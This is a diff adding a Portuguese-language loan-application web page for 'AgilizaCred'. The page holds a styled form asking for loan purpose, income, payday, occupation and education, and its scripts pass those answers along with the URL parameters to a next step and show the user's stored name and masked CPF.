@@ -1,0 +1,747 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+  window.pixelId = "69853718bc934f7cb27cf6c5";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Informações do Empréstimo — AgilizaCred</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700&family=Outfit:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Sora:wght@700;800&display=swap');
+
+    :root {
+      --green: #22C55E;
+      --green-dark: #16A34A;
+      --green-light: #DCFCE7;
+      --green-subtle: #F0FDF4;
+      --bg: #F4F5F7;
+      --card: #FFFFFF;
+      --text: #111827;
+      --text-mid: #374151;
+      --text-light: #6B7280;
+      --border: #E5E7EB;
+      --border-light: #F3F4F6;
+      --danger: #EF4444;
+      --radius: 18px;
+      --shadow: 0 4px 24px rgba(0,0,0,.06), 0 1px 2px rgba(0,0,0,.04);
+    }
+
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+
+    body{
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      padding-top: 72px;
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    /* =================== HEADER =================== */
+    header.header{
+      background: #FFFFFF;
+      padding: 14px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 1px 0 var(--border);
+    }
+    .header-content{
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 420px;
+      margin: 0 auto;
+    }
+    .header-left{
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .menu-icon{
+      width: 40px;
+      height: 40px;
+      background: var(--border-light);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid var(--border);
+    }
+    .menu-icon:hover{
+      background: var(--border);
+      transform: scale(1.05);
+    }
+    .menu-icon svg{
+      width: 18px;
+      height: 18px;
+      color: var(--text-mid);
+      stroke-width: 2.5;
+    }
+
+        /* LOGO */
+    .logo{ display: flex; align-items: center; user-select: none; gap: 0; }
+    .logo-cred{
+      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
+      font-weight: 800; font-size: 20px; color: #111827;
+      letter-spacing: -0.5px; line-height: 1;
+    }
+    .logo-diamond{
+      width: 7px; height: 7px; background: #22C55E;
+      transform: rotate(45deg); margin: 0 8px;
+      border-radius: 1.5px; flex-shrink: 0;
+    }
+    .logo-on{
+      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
+      font-weight: 800; font-size: 20px; color: #22C55E;
+      letter-spacing: -0.5px; line-height: 1;
+    }
+
+    .header-right{
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .user-info{
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 1px;
+    }
+    .user-name{
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      max-width: 120px;
+    }
+    .user-cpf{
+      font-size: 11px;
+      font-weight: 400;
+      color: var(--text-light);
+      letter-spacing: 0.3px;
+    }
+    .user-icon-wrapper{
+      width: 40px;
+      height: 40px;
+      background: var(--green-light);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid var(--green);
+      flex-shrink: 0;
+      color: var(--green-dark);
+    }
+    .user-icon-wrapper svg{
+      width: 20px;
+      height: 20px;
+      stroke-width: 2;
+    }
+
+    /* =================== CONTAINER =================== */
+    .container{
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
+      flex: 1;
+      overflow: visible;
+    }
+
+    /* =================== CARD =================== */
+    .card{
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 24px;
+      margin-bottom: 20px;
+      border: 1px solid var(--border);
+      overflow: visible;
+      position: relative;
+    }
+
+    /* =================== PROGRESS =================== */
+    .progress-bar{
+      background: var(--border-light);
+      border-radius: 10px;
+      height: 5px;
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+    .progress-fill{
+      background: var(--green);
+      height: 100%;
+      width: 20%;
+      border-radius: 10px;
+      transition: width 0.4s cubic-bezier(.22,.68,0,1);
+    }
+
+    /* =================== HEADER SECTION =================== */
+    .header-section{
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    .header-icon-box{
+      width: 52px;
+      height: 52px;
+      background: var(--green);
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 14px;
+      box-shadow: 0 4px 15px rgba(34,197,94,.25);
+    }
+    .header-icon-box svg{
+      width: 26px;
+      height: 26px;
+      color: white;
+    }
+    h1{
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.35rem;
+      font-weight: 700;
+      margin: 0 0 6px;
+      color: var(--text);
+      letter-spacing: -0.3px;
+    }
+    .subtitle{
+      color: var(--text-light);
+      font-size: 14px;
+      margin: 0;
+    }
+
+    /* =================== FORM =================== */
+    .form-group{
+      margin-bottom: 18px;
+      position: relative;
+      z-index: 1;
+    }
+    .form-group:focus-within{ z-index: 10; }
+
+    .form-label{
+      display: block;
+      color: var(--text-mid);
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      padding-left: 2px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .form-select{
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      font-size: 15px;
+      background: #fff;
+      color: var(--text-mid);
+      transition: all 0.2s ease;
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e");
+      background-position: right 14px center;
+      background-repeat: no-repeat;
+      background-size: 16px;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      position: relative;
+      z-index: 1;
+    }
+    .form-select:focus,
+    .form-select:active{ z-index: 100; }
+    .form-select:focus{
+      outline: none;
+      border-color: var(--green);
+      box-shadow: 0 0 0 3px rgba(34,197,94,.12);
+    }
+    .form-select:hover{ border-color: var(--green); }
+    .form-select option{ padding: 12px; font-size: 15px; }
+    .form-select.error{
+      border-color: var(--danger);
+      animation: shake 0.4s ease;
+    }
+    .form-select.success{ border-color: var(--green); }
+
+    .error-message{
+      display: none;
+      color: var(--danger);
+      font-size: 12px;
+      margin-top: 6px;
+      padding-left: 4px;
+    }
+
+    @keyframes shake{
+      0%,100%{transform:translateX(0);}
+      25%{transform:translateX(-5px);}
+      75%{transform:translateX(5px);}
+    }
+
+    /* =================== BUTTON =================== */
+    .btn-submit{
+      width: 100%;
+      padding: 16px;
+      background: var(--green);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 22px;
+      position: relative;
+      overflow: hidden;
+      font-family: 'DM Sans', sans-serif;
+      box-shadow: 0 4px 15px rgba(34,197,94,.3);
+    }
+    .btn-submit:hover{
+      transform: translateY(-2px);
+      box-shadow: 0 6px 24px rgba(34,197,94,.35);
+      background: var(--green-dark);
+    }
+    .btn-submit:active{ transform: scale(0.98); }
+    .btn-submit::after{
+      content: "";
+      position: absolute;
+      top: 0; left: -100%; width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+    .btn-submit:hover::after{ left: 100%; }
+    .btn-submit.loading .text{ opacity: 0; }
+    .btn-submit .loading{
+      display: none;
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    .btn-submit.loading .loading{ display: block; }
+
+    .spinner{
+      width: 22px;
+      height: 22px;
+      border: 2.5px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin{ to{transform:rotate(360deg);} }
+
+    /* =================== SUCCESS FEEDBACK =================== */
+    .success-feedback{
+      display: none;
+      background: var(--green-subtle);
+      color: var(--green-dark);
+      padding: 14px 16px;
+      border-radius: 12px;
+      text-align: center;
+      margin-top: 16px;
+      font-weight: 500;
+      font-size: 14px;
+      border: 1px solid #BBF7D0;
+    }
+    .success-feedback-inner{
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .success-feedback svg{
+      width: 18px;
+      height: 18px;
+      color: var(--green);
+    }
+
+    /* =================== TRUST BAR =================== */
+    .trust-bar{
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 18px;
+      padding: 10px 14px;
+      background: var(--green-subtle);
+      border-radius: 10px;
+      border: 1px solid #BBF7D0;
+    }
+    .trust-bar svg{
+      width: 16px; height: 16px;
+      color: var(--green-dark);
+      flex-shrink: 0;
+    }
+    .trust-bar span{
+      font-size: 12px;
+      color: var(--green-dark);
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    /* =================== FOOTER =================== */
+    footer.site-footer{
+      margin-top: auto;
+      background: #FFFFFF;
+      color: var(--text-light);
+      padding: 24px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      border-top: 1px solid var(--border);
+    }
+    .footer-inner{
+      max-width: 420px; width: 100%;
+      display: flex; flex-direction: column;
+      align-items: center; gap: 10px;
+    }
+    .footer-logo{
+      display: flex; align-items: center; user-select: none;
+    }
+    .footer-logo .logo-cred{ font-size: 15px; color: #6B7280; }
+    .footer-logo .logo-diamond{ width: 5px; height: 5px; margin: 0 6px; background: #6B7280; }
+    .footer-logo .logo-on{ font-size: 15px; color: #22C55E; }
+    footer small{ font-size: 11px; opacity: 0.75; line-height: 1.5; }
+    footer small strong{ color: var(--green-dark); font-weight: 600; }
+    .footer-badges{
+      display: flex; align-items: center; gap: 16px; margin-top: 4px;
+    }
+    .footer-badges span{
+      display: flex; align-items: center; gap: 4px;
+      font-size: 10px; color: #9CA3AF; font-weight: 500;
+    }
+    .footer-badges svg{ width: 12px; height: 12px; color: #9CA3AF; }
+
+    @media (max-width: 480px){
+      .container{ padding: 16px; }
+      .card{ padding: 20px; }
+      h1{ font-size: 1.25rem; }
+    }
+      .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
+    .logo-row { display:flex; align-items:center; }
+    .logo-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:#6B7280; margin-top:1px; }
+    .footer-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:#9CA3AF; margin-top:1px; }
+  </style>
+</head>
+
+<body>
+
+<header class="header">
+  <div class="header-content">
+    <div class="header-left">
+      <div class="menu-icon">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </div>
+      <div class="logo-wrap"><div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div><span class="logo-tagline">Crédito Fácil</span></div>
+    </div>
+    
+    <div class="header-right">
+      <div class="user-info">
+        <span class="user-name" id="userName">Usuário</span>
+        <span class="user-cpf" id="userCpf">000.***.***-00</span>
+      </div>
+      <div class="user-icon-wrapper">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+  <div class="card">
+    <div class="progress-bar">
+      <div class="progress-fill"></div>
+    </div>
+
+    <div class="header-section">
+      <div class="header-icon-box">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+        </svg>
+      </div>
+      <h1>Informações do Empréstimo</h1>
+      <p class="subtitle">Preencha os dados abaixo para encontrarmos a melhor oferta para você</p>
+    </div>
+
+    <form id="loanForm" onsubmit="return handleFormSubmit(event)">
+      <div class="form-group">
+        <label class="form-label" for="loanPurpose">Finalidade do Empréstimo</label>
+        <select class="form-select" id="loanPurpose" name="loanPurpose" required="">
+          <option value="" disabled="" selected="">Selecione a finalidade</option>
+          <option value="Pagar dívidas">Pagar dívidas</option>
+          <option value="Compras">Compras</option>
+          <option value="Reforma">Reforma</option>
+          <option value="Investimento">Investimento</option>
+          <option value="Saúde">Saúde</option>
+          <option value="Educação">Educação</option>
+          <option value="Viagem">Viagem</option>
+          <option value="Outros">Outros</option>
+        </select>
+        <div class="error-message">Por favor, selecione a finalidade</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="monthlyIncome">Renda Mensal</label>
+        <select class="form-select" id="monthlyIncome" name="monthlyIncome" required="">
+          <option value="" disabled="" selected="">Selecione sua renda</option>
+          <option value="Até R$ 1.500">Até R$ 1.500</option>
+          <option value="R$ 1.500 a R$ 3.000">R$ 1.500 a R$ 3.000</option>
+          <option value="R$ 3.000 a R$ 5.000">R$ 3.000 a R$ 5.000</option>
+          <option value="R$ 5.000 a R$ 10.000">R$ 5.000 a R$ 10.000</option>
+          <option value="Acima de R$ 10.000">Acima de R$ 10.000</option>
+        </select>
+        <div class="error-message">Por favor, selecione sua renda</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="paymentDay">Dia de Recebimento</label>
+        <select class="form-select" id="paymentDay" name="paymentDay" required="">
+          <option value="" disabled="" selected="">Selecione o dia</option>
+          <option value="1">Dia 1</option>
+          <option value="5">Dia 5</option>
+          <option value="10">Dia 10</option>
+          <option value="15">Dia 15</option>
+          <option value="20">Dia 20</option>
+          <option value="25">Dia 25</option>
+          <option value="30">Dia 30</option>
+        </select>
+        <div class="error-message">Por favor, selecione o dia que você recebe</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="occupation">Ocupação</label>
+        <select class="form-select" id="occupation" name="occupation" required="">
+          <option value="" disabled="" selected="">Selecione sua ocupação</option>
+          <option value="Empresário">Empresário</option>
+          <option value="Dona de casa">Dona de casa</option>
+          <option value="Empregado CLT">Empregado CLT</option>
+          <option value="Autônomo">Autônomo</option>
+          <option value="Funcionário público">Funcionário público</option>
+          <option value="Rentista">Rentista</option>
+          <option value="Aposentado/Pensionista">Aposentado/Pensionista</option>
+          <option value="Estudante">Estudante</option>
+          <option value="Desempregado">Desempregado</option>
+          <option value="Outro">Outro</option>
+        </select>
+        <div class="error-message">Por favor, selecione sua ocupação</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="education">Escolaridade</label>
+        <select class="form-select" id="education" name="education" required="">
+          <option value="" disabled="" selected="">Selecione sua escolaridade</option>
+          <option value="Fundamental">Ensino Fundamental</option>
+          <option value="Médio">Ensino Médio</option>
+          <option value="Superior">Ensino Superior</option>
+          <option value="Pós-Graduação">Pós-Graduação</option>
+          <option value="Outro">Outro</option>
+        </select>
+        <div class="error-message">Por favor, selecione sua escolaridade</div>
+      </div>
+
+      <div class="success-feedback" id="successFeedback">
+        <div class="success-feedback-inner">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+          </svg>
+          Informações validadas! Redirecionando...
+        </div>
+      </div>
+
+      <button type="submit" class="btn-submit" id="submitBtn">
+        <div class="loading">
+          <div class="spinner"></div>
+        </div>
+        <span class="text">Continuar para Próxima Etapa</span>
+      </button>
+
+      <div class="trust-bar">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+        </svg>
+        <span>Suas informações são utilizadas apenas para análise de crédito.</span>
+      </div>
+    </form>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-logo">
+      <span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span>
+    </div>
+    <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>
+    CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
+    <div class="footer-badges">
+      <span>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        SSL Seguro
+      </span>
+      <span>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+        Dados protegidos
+      </span>
+      <span>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"></path></svg>
+        Instituição regulada
+      </span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  function loadUserData() {
+    const nome = localStorage.getItem('nome');
+    const cpf = localStorage.getItem('cpf');
+    
+    if (nome) {
+      const nomes = nome.trim().split(' ');
+      const primeiroNome = nomes[0];
+      const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+      const nomeExibicao = ultimoNome ? `${primeiroNome} ${ultimoNome}` : primeiroNome;
+      document.getElementById('userName').textContent = nomeExibicao;
+    }
+    
+    if (cpf) {
+      const cpfLimpo = cpf.replace(/\D/g, '');
+      if (cpfLimpo.length === 11) {
+        const cpfMascarado = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
+        document.getElementById('userCpf').textContent = cpfMascarado;
+      }
+    }
+  }
+  
+  document.addEventListener('DOMContentLoaded', loadUserData);
+  
+  function handleFormSubmit(event) {
+    event.preventDefault();
+    
+    const formData = new FormData(document.getElementById('loanForm'));
+    const formParams = {};
+    
+    for (let [key, value] of formData.entries()) {
+      formParams[key] = value;
+    }
+    
+    const currentUrlParams = new URLSearchParams(window.location.search);
+    currentUrlParams.forEach((value, key) => {
+      formParams[key] = value;
+    });
+    
+    const urlParams = new URLSearchParams(formParams);
+    const targetUrl = `4.html?${urlParams.toString()}`;
+    
+    window.location.href = targetUrl;
+    
+    return false;
+  }
+
+  const form = document.getElementById('loanForm');
+  const submitBtn = document.getElementById('submitBtn');
+  const successFeedback = document.getElementById('successFeedback');
+  const selects = form.querySelectorAll('.form-select');
+  
+  let completedFields = 0;
+  const totalFields = selects.length;
+
+  selects.forEach((select, index) => {
+    select.addEventListener('change', function() {
+      validateField(this);
+      updateProgress();
+      
+      const formGroup = this.closest('.form-group');
+      if (this.value) {
+        formGroup.classList.add('completed');
+        
+        if (window.innerWidth <= 768 && index < selects.length - 1) {
+          setTimeout(() => {
+            selects[index + 1].scrollIntoView({ behavior: 'smooth', block: 'center' });
+            selects[index + 1].focus();
+          }, 300);
+        }
+      } else {
+        formGroup.classList.remove('completed');
+      }
+    });
+  });
+
+  function validateField(field) {
+    const formGroup = field.closest('.form-group');
+    const errorMsg = formGroup.querySelector('.error-message');
+    
+    if (field.value) {
+      field.classList.remove('error');
+      field.classList.add('success');
+      errorMsg.style.display = 'none';
+      return true;
+    } else {
+      field.classList.add('error');
+      field.classList.remove('success');
+      errorMsg.style.display = 'block';
+      return false;
+    }
+  }
+
+  function updateProgress() {
+    completedFields = Array.from(selects).filter(select => select.value).length;
+    const progressPercent = (completedFields / totalFields) * 100;
+    document.querySelector('.progress-fill').style.width = `${Math.max(progressPercent, 20)}%`;
+  }
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    let isValid = true;
+    selects.forEach(select => {
+      if (!validateField(select)) {
+        isValid = false;
+      }
+    });
+
+    if (!isValid) {
+      const firstError = form.querySelector('.form-select.error');
+      if (firstError) {
+        firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        firstError.focus();
+      }
+      return;
+    }
+
+    submitBtn.classList.add('loading');
+    submitBtn.disabled = true;
+
+    setTimeout(() => {
+      successFeedback.style.display = 'block';
+      successFeedback.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      document.querySelector('.progress-fill').style.width = '100%';
+      
+      setTimeout(() => {
+        handleFormSubmit(e);
+      }, 1500);
+    }, 800);
+  });
+
+  updateProgress();
+</script>
+
+
+
+</body></html>
